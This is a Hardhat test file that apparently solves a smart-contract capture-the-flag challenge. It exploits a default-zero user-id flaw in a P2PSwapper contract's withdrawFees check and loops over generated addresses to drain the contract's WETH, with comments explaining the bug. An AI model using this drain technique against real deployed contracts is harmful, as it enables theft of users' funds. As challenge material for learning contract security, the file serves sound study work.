import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
const BN = BigNumber;
let precision = BN.from(10).pow(18);
let denom = BN.from(10).pow(11);

let accounts: Signer[];
let attacker: Signer;
let other1: Signer;
let other2: Signer;

let shitToken: Contract;
let weth: Contract;
let p2pSwapper: Contract;


before(async () => {
  accounts = await ethers.getSigners();
  [attacker, other1, other2] = accounts;

  const wethFactory = await ethers.getContractFactory('P2P_WETH')
  weth = await wethFactory.connect(other2).deploy()

  const shitTokenFactory = await ethers.getContractFactory('Token')
  shitToken = await shitTokenFactory.connect(other2).deploy('SHIT',await other2.getAddress(),precision.mul(100_000))

  // initiating P2PSwapper and submitting a trade from WETH -> SHIT
  const p2pSwapperFactory = await ethers.getContractFactory('P2PSwapper')
  p2pSwapper = await p2pSwapperFactory.connect(other2).deploy(weth.address)

  await weth.connect(other2).deposit({value:precision.mul(1)})
  await weth.connect(other2).approve(p2pSwapper.address,ethers.constants.MaxUint256)

  await p2pSwapper.connect(other2).createDeal(weth.address,precision.mul(1).div(denom),shitToken.address,precision.mul(1).div(denom),{value:2_000_000}) // submitting 1-1 trade between WETH and SHIT, numbers selected for easy math
});

it("solves the challenge", async function () {

  // the default value for any address in the userByAddress mapping is 0 (e.g. user id)
  // thus if a user has not called signup(..), then their id will default to 0
  await weth.connect(attacker).deposit({value:precision.mul(1)})
  await weth.connect(attacker).approve(p2pSwapper.address,precision.mul(1))
  await p2pSwapper.connect(attacker).createDeal(weth.address,1_000_000,weth.address,1_000_000,{value:2_000_000})
  console.log(await weth.balanceOf(p2pSwapper.address))

  // remember that all new addresses will have their id default to 0
  let numLoops = (await weth.balanceOf(p2pSwapper.address)) / (await p2pSwapper.partnerFees(0))

  let genAddress
  for (let i=1; i<numLoops+1; i++) {
    // this works as long as numLoops < 256
    genAddress = "0x"+"0".repeat(38)+ethers.utils.hexlify(i).substring(2)
    await p2pSwapper.connect(attacker).withdrawFees(genAddress)
  }

  // in withdrawFees(..) there is the statement: require(partnerById[userId] == userByAddress[msg.sender])
  // it is checking whether you are the address who referred the user whom you want to withdraw fees for
  // without calling signup(..), userByAddress[..] will default to 0
  // additionally, partnerById[..] will also default to 0
  // this results in arbitrary addresses passing this check

  console.log(await weth.balanceOf(p2pSwapper.address))

});

after(async () => {
  expect(await weth.balanceOf(p2pSwapper.address)).to.be.equal(0)
});
